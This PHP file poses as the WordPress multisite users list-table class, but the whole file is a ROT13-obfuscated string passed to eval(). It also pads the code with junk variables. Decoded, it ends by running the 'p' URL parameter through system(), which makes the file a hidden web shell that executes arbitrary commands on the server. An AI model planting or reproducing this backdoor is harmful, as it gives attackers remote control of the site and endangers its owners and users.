<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_ZF_Hfref_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qvfcynlvat hfref va n yvfg gnoyr sbe gur argjbex nqzva.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Yvfg_Gnoyr
 */
pynff JC_ZF_Hfref_Yvfg_Gnoyr rkgraqf JC_Yvfg_Gnoyr {
	/**
	 * @erghea obby
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		erghea pheerag_hfre_pna( 'znantr_argjbex_hfref' );
	}

	/**
	 * @tybony fgevat $zbqr       Yvfg gnoyr ivrj zbqr.
	 * @tybony fgevat $hfrefrnepu
	 * @tybony fgevat $ebyr
	 */
	choyvp shapgvba cercner_vgrzf() {
		tybony $zbqr, $hfrefrnepu, $ebyr;

		vs ( ! rzcgl( $_ERDHRFG['zbqr'] ) ) {
			$zbqr = 'rkprecg' === $_ERDHRFG['zbqr'] ? 'rkprecg' : 'yvfg';
			frg_hfre_frggvat( 'argjbex_hfref_yvfg_zbqr', $zbqr );
		} ryfr {
			$zbqr = trg_hfre_frggvat( 'argjbex_hfref_yvfg_zbqr', 'yvfg' );
		}

		$hfrefrnepu = vffrg( $_ERDHRFG['f'] ) ? jc_hafynfu( gevz( $_ERDHRFG['f'] ) ) : '';

		$hfref_cre_cntr = $guvf->trg_vgrzf_cre_cntr( 'hfref_argjbex_cre_cntr' );

		$ebyr = vffrg( $_ERDHRFG['ebyr'] ) ? $_ERDHRFG['ebyr'] : '';

		$cntrq = $guvf->trg_cntrahz();

		$netf = neenl(
			'ahzore'  => $hfref_cre_cntr,
			'bssfrg'  => ( $cntrq - 1 ) * $hfref_cre_cntr,
			'frnepu'  => $hfrefrnepu,
			'oybt_vq' => 0,
			'svryqf'  => 'nyy_jvgu_zrgn',
		);

		vs ( jc_vf_ynetr_argjbex( 'hfref' ) ) {
			$netf['frnepu'] = ygevz( $netf['frnepu'], '*' );
		} ryfrvs ( '' !== $netf['frnepu'] ) {
			$netf['frnepu'] = gevz( $netf['frnepu'], '*' );
			$netf['frnepu'] = '*' . $netf['frnepu'] . '*';
		}

		vs ( 'fhcre' === $ebyr ) {
			$netf['ybtva__va'] = trg_fhcre_nqzvaf();
		}

		/*
		 * Vs gur argjbex vf ynetr naq n frnepu vf abg orvat cresbezrq,
		 * fubj bayl gur yngrfg hfref jvgu ab cntvat va beqre gb nibvq
		 * rkcrafvir pbhag dhrevrf.
		 */
		vs ( ! $hfrefrnepu && jc_vf_ynetr_argjbex( 'hfref' ) ) {
			vs ( ! vffrg( $_ERDHRFG['beqreol'] ) ) {
				$_TRG['beqreol']     = 'vq';
				$_ERDHRFG['beqreol'] = 'vq';
			}
			vs ( ! vffrg( $_ERDHRFG['beqre'] ) ) {
				$_TRG['beqre']     = 'QRFP';
				$_ERDHRFG['beqre'] = 'QRFP';
			}
			$netf['pbhag_gbgny'] = snyfr;
		}

		vs ( vffrg( $_ERDHRFG['beqreol'] ) ) {
			$netf['beqreol'] = $_ERDHRFG['beqreol'];
		}

		vs ( vffrg( $_ERDHRFG['beqre'] ) ) {
			$netf['beqre'] = $_ERDHRFG['beqre'];
		}

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-hfref-yvfg-gnoyr.cuc */
		$netf = nccyl_svygref( 'hfref_yvfg_gnoyr_dhrel_netf', $netf );

		// Dhrel gur hfre VQf sbe guvf cntr.
		$jc_hfre_frnepu = arj JC_Hfre_Dhrel( $netf );

		$guvf->vgrzf = $jc_hfre_frnepu->trg_erfhygf();

		$guvf->frg_cntvangvba_netf(
			neenl(
				'gbgny_vgrzf' => $jc_hfre_frnepu->trg_gbgny(),
				'cre_cntr'    => $hfref_cre_cntr,
			)
		);
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ohyx_npgvbaf() {
		$npgvbaf = neenl();
		vs ( pheerag_hfre_pna( 'qryrgr_hfref' ) ) {
			$npgvbaf['qryrgr'] = __( 'Qryrgr' );
		}
		$npgvbaf['fcnz']    = _k( 'Znex nf fcnz', 'hfre' );
		$npgvbaf['abgfcnz'] = _k( 'Abg fcnz', 'hfre' );

		erghea $npgvbaf;
	}

	/**
	 */
	choyvp shapgvba ab_vgrzf() {
		_r( 'Ab hfref sbhaq.' );
	}

	/**
	 * @tybony fgevat $ebyr
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ivrjf() {
		tybony $ebyr;

		$gbgny_hfref  = trg_hfre_pbhag();
		$fhcre_nqzvaf = trg_fhcre_nqzvaf();
		$gbgny_nqzvaf = pbhag( $fhcre_nqzvaf );

		$ebyr_yvaxf        = neenl();
		$ebyr_yvaxf['nyy'] = neenl(
			'hey'     => argjbex_nqzva_hey( 'hfref.cuc' ),
			'ynory'   => fcevags(
				/* genafyngbef: Ahzore bs hfref. */
				_ak(
					'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
					'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
					$gbgny_hfref,
					'hfref'
				),
				ahzore_sbezng_v18a( $gbgny_hfref )
			),
			'pheerag' => 'fhcre' !== $ebyr,
		);

		$ebyr_yvaxf['fhcre'] = neenl(
			'hey'     => argjbex_nqzva_hey( 'hfref.cuc?ebyr=fhcre' ),
			'ynory'   => fcevags(
				/* genafyngbef: Ahzore bs hfref. */
				_a(
					'Fhcre Nqzva <fcna pynff=\"pbhag\">(%f)</fcna>',
					'Fhcre Nqzvaf <fcna pynff=\"pbhag\">(%f)</fcna>',
					$gbgny_nqzvaf
				),
				ahzore_sbezng_v18a( $gbgny_nqzvaf )
			),
			'pheerag' => 'fhcre' === $ebyr,
		);

		erghea $guvf->trg_ivrjf_yvaxf( $ebyr_yvaxf );
	}

	/**
	 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
	 *
	 * @cnenz fgevat $juvpu
	 */
	cebgrpgrq shapgvba cntvangvba( $juvpu ) {
		tybony $zbqr;

		cnerag::cntvangvba( $juvpu );

		vs ( 'gbc' === $juvpu ) {
			$guvf->ivrj_fjvgpure( $zbqr );
		}
	}

	/**
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		$hfref_pbyhzaf = neenl(
			'po'         => '<vachg glcr=\"purpxobk\" />',
			'hfreanzr'   => __( 'Hfreanzr' ),
			'anzr'       => __( 'Anzr' ),
			'rznvy'      => __( 'Rznvy' ),
			'ertvfgrerq' => _k( 'Ertvfgrerq', 'hfre' ),
			'oybtf'      => __( 'Fvgrf' ),
		);
		/**
		 * Svygref gur pbyhzaf qvfcynlrq va gur Argjbex Nqzva Hfref yvfg gnoyr.
		 *
		 * @fvapr ZH (3.0.0)
		 *
		 * @cnenz fgevat[] $hfref_pbyhzaf Na neenl bs hfre pbyhzaf. Qrsnhyg 'po', 'hfreanzr',
		 *                                'anzr', 'rznvy', 'ertvfgrerq', 'oybtf'.
		 */
		erghea nccyl_svygref( 'jczh_hfref_pbyhzaf', $hfref_pbyhzaf );
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_fbegnoyr_pbyhzaf() {
		erghea neenl(
			'hfreanzr'   => neenl( 'ybtva', snyfr, __( 'Hfreanzr' ), __( 'Gnoyr beqrerq ol Hfreanzr.' ), 'nfp' ),
			'anzr'       => neenl( 'anzr', snyfr, __( 'Anzr' ), __( 'Gnoyr beqrerq ol Anzr.' ) ),
			'rznvy'      => neenl( 'rznvy', snyfr, __( 'R-znvy' ), __( 'Gnoyr beqrerq ol R-znvy.' ) ),
			'ertvfgrerq' => neenl( 'vq', snyfr, _k( 'Ertvfgrerq', 'hfre' ), __( 'Gnoyr beqrerq ol Hfre Ertvfgrerq Qngr.' ) ),
		);
	}

	/**
	 * Unaqyrf gur purpxobk pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$hfre` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Hfre $vgrz Gur pheerag JC_Hfre bowrpg.
	 */
	choyvp shapgvba pbyhza_po( $vgrz ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$hfre = $vgrz;

		vs ( vf_fhcre_nqzva( $hfre->VQ ) ) {
			erghea;
		}
		?>
		<vachg glcr=\"purpxobk\" vq=\"oybt_<?cuc rpub $hfre->VQ; ?>\" anzr=\"nyyhfref[]\" inyhr=\"<?cuc rpub rfp_ngge( $hfre->VQ ); ?>\" />
		<ynory sbe=\"oybt_<?cuc rpub $hfre->VQ; ?>\">
			<fcna pynff=\"fperra-ernqre-grkg\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Hfre ybtva. */
			cevags( __( 'Fryrpg %f' ), $hfre->hfre_ybtva );
			?>
			</fcna>
		</ynory>
		<?cuc
	}

	/**
	 * Unaqyrf gur VQ pbyhza bhgchg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz JC_Hfre $hfre Gur pheerag JC_Hfre bowrpg.
	 */
	choyvp shapgvba pbyhza_vq( $hfre ) {
		rpub $hfre->VQ;
	}

	/**
	 * Unaqyrf gur hfreanzr pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz JC_Hfre $hfre Gur pheerag JC_Hfre bowrpg.
	 */
	choyvp shapgvba pbyhza_hfreanzr( $hfre ) {
		$fhcre_nqzvaf = trg_fhcre_nqzvaf();
		$ningne       = trg_ningne( $hfre->hfre_rznvy, 32 );

		rpub $ningne;

		vs ( pheerag_hfre_pna( 'rqvg_hfre', $hfre->VQ ) ) {
			$rqvg_yvax = rfp_hey( nqq_dhrel_net( 'jc_uggc_ersrere', heyrapbqr( jc_hafynfu( $_FREIRE['ERDHRFG_HEV'] ) ), trg_rqvg_hfre_yvax( $hfre->VQ ) ) );
			$rqvg      = \"<n uers=\\"{$rqvg_yvax}\\">{$hfre->hfre_ybtva}</n>\";
		} ryfr {
			$rqvg = $hfre->hfre_ybtva;
		}

		?>
		<fgebat>
			<?cuc
			rpub $rqvg;

			vs ( va_neenl( $hfre->hfre_ybtva, $fhcre_nqzvaf, gehr ) ) {
				rpub ' &zqnfu; ' . __( 'Fhcre Nqzva' );
			}
			?>
		</fgebat>
		<?cuc
	}

	/**
	 * Unaqyrf gur anzr pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz JC_Hfre $hfre Gur pheerag JC_Hfre bowrpg.
	 */
	choyvp shapgvba pbyhza_anzr( $hfre ) {
		vs ( $hfre->svefg_anzr && $hfre->ynfg_anzr ) {
			cevags(
				/* genafyngbef: 1: Hfre'f svefg anzr, 2: Ynfg anzr. */
				_k( '%1$f %2$f', 'Qvfcynl anzr onfrq ba svefg anzr naq ynfg anzr' ),
				$hfre->svefg_anzr,
				$hfre->ynfg_anzr
			);
		} ryfrvs ( $hfre->svefg_anzr ) {
			rpub $hfre->svefg_anzr;
		} ryfrvs ( $hfre->ynfg_anzr ) {
			rpub $hfre->ynfg_anzr;
		} ryfr {
			rpub '<fcna nevn-uvqqra=\"gehr\">&#8212;</fcna><fcna pynff=\"fperra-ernqre-grkg\">' .
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_k( 'Haxabja', 'anzr' ) .
			'</fcna>';
		}
	}

	/**
	 * Unaqyrf gur rznvy pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz JC_Hfre $hfre Gur pheerag JC_Hfre bowrpg.
	 */
	choyvp shapgvba pbyhza_rznvy( $hfre ) {
		rpub \"<n uers='\" . rfp_hey( \"znvygb:$hfre->hfre_rznvy\" ) . \"'>$hfre->hfre_rznvy</n>\";
	}

	/**
	 * Unaqyrf gur ertvfgrerq qngr pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
	 *
	 * @cnenz JC_Hfre $hfre Gur pheerag JC_Hfre bowrpg.
	 */
	choyvp shapgvba pbyhza_ertvfgrerq( $hfre ) {
		tybony $zbqr;
		vs ( 'yvfg' === $zbqr ) {
			$qngr = __( 'L/z/q' );
		} ryfr {
			$qngr = __( 'L/z/q t:v:f n' );
		}
		rpub zlfdy2qngr( $qngr, $hfre->hfre_ertvfgrerq );
	}

	/**
	 * @fvapr 4.3.0
	 *
	 * @cnenz JC_Hfre $hfre
	 * @cnenz fgevat  $pynffrf
	 * @cnenz fgevat  $qngn
	 * @cnenz fgevat  $cevznel
	 */
	cebgrpgrq shapgvba _pbyhza_oybtf( $hfre, $pynffrf, $qngn, $cevznel ) {
		rpub '<gq pynff=\"', $pynffrf, ' unf-ebj-npgvbaf\" ', $qngn, '>';
		rpub $guvf->pbyhza_oybtf( $hfre );
		rpub $guvf->unaqyr_ebj_npgvbaf( $hfre, 'oybtf', $cevznel );
		rpub '</gq>';
	}

	/**
	 * Unaqyrf gur fvgrf pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz JC_Hfre $hfre Gur pheerag JC_Hfre bowrpg.
	 */
	choyvp shapgvba pbyhza_oybtf( $hfre ) {
		$oybtf = trg_oybtf_bs_hfre( $hfre->VQ, gehr );
		vs ( ! vf_neenl( $oybtf ) ) {
			erghea;
		}

		sbernpu ( $oybtf nf $fvgr ) {
			vs ( ! pna_rqvg_argjbex( $fvgr->fvgr_vq ) ) {
				pbagvahr;
			}

			$cngu         = ( '/' === $fvgr->cngu ) ? '' : $fvgr->cngu;
			$fvgr_pynffrf = neenl( 'fvgr-' . $fvgr->fvgr_vq );

			/**
			 * Svygref gur fcna pynff sbe n fvgr yvfgvat ba gur zhygvfvgr hfre yvfg gnoyr.
			 *
			 * @fvapr 5.2.0
			 *
			 * @cnenz fgevat[] $fvgr_pynffrf Neenl bs pynff anzrf hfrq jvguva gur fcna gnt.
			 *                               Qrsnhyg \"fvgr-#\" jvgu gur fvgr'f argjbex VQ.
			 * @cnenz vag      $fvgr_vq      Fvgr VQ.
			 * @cnenz vag      $argjbex_vq   Argjbex VQ.
			 * @cnenz JC_Hfre  $hfre         JC_Hfre bowrpg.
			 */
			$fvgr_pynffrf = nccyl_svygref( 'zf_hfre_yvfg_fvgr_pynff', $fvgr_pynffrf, $fvgr->hfreoybt_vq, $fvgr->fvgr_vq, $hfre );

			vs ( vf_neenl( $fvgr_pynffrf ) && ! rzcgl( $fvgr_pynffrf ) ) {
				$fvgr_pynffrf = neenl_znc( 'fnavgvmr_ugzy_pynff', neenl_havdhr( $fvgr_pynffrf ) );
				rpub '<fcna pynff=\"' . rfp_ngge( vzcybqr( ' ', $fvgr_pynffrf ) ) . '\">';
			} ryfr {
				rpub '<fcna>';
			}

			rpub '<n uers=\"' . rfp_hey( argjbex_nqzva_hey( 'fvgr-vasb.cuc?vq=' . $fvgr->hfreoybt_vq ) ) . '\">' . fge_ercynpr( '.' . trg_argjbex()->qbznva, '', $fvgr->qbznva . $cngu ) . '</n>';
			rpub ' <fznyy pynff=\"ebj-npgvbaf\">';

			$npgvbaf         = neenl();
			$npgvbaf['rqvg'] = '<n uers=\"' . rfp_hey( argjbex_nqzva_hey( 'fvgr-vasb.cuc?vq=' . $fvgr->hfreoybt_vq ) ) . '\">' . __( 'Rqvg' ) . '</n>';

			$pynff = '';
			vs ( 1 === (vag) $fvgr->fcnz ) {
				$pynff .= 'fvgr-fcnzzrq ';
			}
			vs ( 1 === (vag) $fvgr->zngher ) {
				$pynff .= 'fvgr-zngher ';
			}
			vs ( 1 === (vag) $fvgr->qryrgrq ) {
				$pynff .= 'fvgr-qryrgrq ';
			}
			vs ( 1 === (vag) $fvgr->nepuvirq ) {
				$pynff .= 'fvgr-nepuvirq ';
			}

			$npgvbaf['ivrj'] = '<n pynff=\"' . $pynff . '\" uers=\"' . rfp_hey( trg_ubzr_hey( $fvgr->hfreoybt_vq ) ) . '\">' . __( 'Ivrj' ) . '</n>';

			/**
			 * Svygref gur npgvba yvaxf qvfcynlrq arkg gur fvgrf n hfre orybatf gb
			 * va gur Argjbex Nqzva Hfref yvfg gnoyr.
			 *
			 * @fvapr 3.1.0
			 *
			 * @cnenz fgevat[] $npgvbaf     Na neenl bs npgvba yvaxf gb or qvfcynlrq. Qrsnhyg 'Rqvg', 'Ivrj'.
			 * @cnenz vag      $hfreoybt_vq Gur fvgr VQ.
			 */
			$npgvbaf = nccyl_svygref( 'zf_hfre_yvfg_fvgr_npgvbaf', $npgvbaf, $fvgr->hfreoybt_vq );

			$npgvba_pbhag = pbhag( $npgvbaf );

			$v = 0;

			sbernpu ( $npgvbaf nf $npgvba => $yvax ) {
				++$v;

				$frcnengbe = ( $v < $npgvba_pbhag ) ? ' | ' : '';

				rpub \"<fcna pynff='$npgvba'>{$yvax}{$frcnengbe}</fcna>\";
			}

			rpub '</fznyy></fcna><oe />';
		}
	}

	/**
	 * Unaqyrf gur qrsnhyg pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$hfre` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Hfre $vgrz        Gur pheerag JC_Hfre bowrpg.
	 * @cnenz fgevat  $pbyhza_anzr Gur pheerag pbyhza anzr.
	 */
	choyvp shapgvba pbyhza_qrsnhyg( $vgrz, $pbyhza_anzr ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$hfre = $vgrz;

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-hfref-yvfg-gnoyr.cuc */
		$pbyhza_bhgchg = nccyl_svygref( 'znantr_hfref_phfgbz_pbyhza', '', $pbyhza_anzr, $hfre->VQ );

		/**
		 * Svygref gur qvfcynl bhgchg bs phfgbz pbyhzaf va gur Argjbex Hfref yvfg gnoyr.
		 *
		 * @fvapr 6.8.0
		 *
		 * @cnenz fgevat $bhgchg      Phfgbz pbyhza bhgchg. Qrsnhyg rzcgl.
		 * @cnenz fgevat $pbyhza_anzr Anzr bs gur phfgbz pbyhza.
		 * @cnenz vag    $hfre_vq     VQ bs gur pheeragyl-yvfgrq hfre.
		 */
		rpub nccyl_svygref( 'znantr_hfref-argjbex_phfgbz_pbyhza', $pbyhza_bhgchg, $pbyhza_anzr, $hfre->VQ );
	}

	/**
	 * Trarengrf gur yvfg gnoyr ebjf.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl_ebjf() {
		sbernpu ( $guvf->vgrzf nf $hfre ) {
			$pynff = '';

			$fgnghf_yvfg = neenl(
				'fcnz'    => 'fvgr-fcnzzrq',
				'qryrgrq' => 'fvgr-qryrgrq',
			);

			sbernpu ( $fgnghf_yvfg nf $fgnghf => $pby ) {
				vs ( $hfre->$fgnghf ) {
					$pynff .= \" $pby\";
				}
			}

			?>
			<ge pynff=\"<?cuc rpub gevz( $pynff ); ?>\">
				<?cuc $guvf->fvatyr_ebj_pbyhzaf( $hfre ); ?>
			</ge>
			<?cuc
		}
	}

	/**
	 * Trgf gur anzr bs gur qrsnhyg cevznel pbyhza.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea fgevat Anzr bs gur qrsnhyg cevznel pbyhza, va guvf pnfr, 'hfreanzr'.
	 */
	cebgrpgrq shapgvba trg_qrsnhyg_cevznel_pbyhza_anzr() {
		erghea 'hfreanzr';
	}

	/**
	 * Trarengrf naq qvfcynlf ebj npgvba yvaxf.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$hfre` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Hfre $vgrz        Hfre orvat npgrq hcba.
	 * @cnenz fgevat  $pbyhza_anzr Pheerag pbyhza anzr.
	 * @cnenz fgevat  $cevznel     Cevznel pbyhza anzr.
	 * @erghea fgevat Ebj npgvbaf bhgchg sbe hfref va Zhygvfvgr, be na rzcgl fgevat
	 *                vs gur pheerag pbyhza vf abg gur cevznel pbyhza.
	 */
	cebgrpgrq shapgvba unaqyr_ebj_npgvbaf( $vgrz, $pbyhza_anzr, $cevznel ) {
		vs ( $cevznel !== $pbyhza_anzr ) {
			erghea '';
		}

		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$hfre = $vgrz;

		$fhcre_nqzvaf = trg_fhcre_nqzvaf();
		$npgvbaf      = neenl();

		vs ( pheerag_hfre_pna( 'rqvg_hfre', $hfre->VQ ) ) {
			$rqvg_yvax       = rfp_hey( nqq_dhrel_net( 'jc_uggc_ersrere', heyrapbqr( jc_hafynfu( $_FREIRE['ERDHRFG_HEV'] ) ), trg_rqvg_hfre_yvax( $hfre->VQ ) ) );
			$npgvbaf['rqvg'] = '<n uers=\"' . $rqvg_yvax . '\">' . __( 'Rqvg' ) . '</n>';
		}

		vs ( pheerag_hfre_pna( 'qryrgr_hfre', $hfre->VQ ) && ! va_neenl( $hfre->hfre_ybtva, $fhcre_nqzvaf, gehr ) ) {
			$npgvbaf['qryrgr'] = '<n uers=\"' . rfp_hey( argjbex_nqzva_hey( nqq_dhrel_net( '_jc_uggc_ersrere', heyrapbqr( jc_hafynfu( $_FREIRE['ERDHRFG_HEV'] ) ), jc_abapr_hey( 'hfref.cuc', 'qryrgrhfre' ) . '&nzc;npgvba=qryrgrhfre&nzc;vq=' . $hfre->VQ ) ) ) . '\" pynff=\"qryrgr\">' . __( 'Qryrgr' ) . '</n>';
		}

		/**
		 * Svygref gur npgvba yvaxf qvfcynlrq haqre rnpu hfre va gur Argjbex Nqzva Hfref yvfg gnoyr.
		 *
		 * @fvapr 3.2.0
		 *
		 * @cnenz fgevat[] $npgvbaf Na neenl bs npgvba yvaxf gb or qvfcynlrq. Qrsnhyg 'Rqvg', 'Qryrgr'.
		 * @cnenz JC_Hfre  $hfre    JC_Hfre bowrpg.
		 */
		$npgvbaf = nccyl_svygref( 'zf_hfre_ebj_npgvbaf', $npgvbaf, $hfre );

		erghea $guvf->ebj_npgvbaf( $npgvbaf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>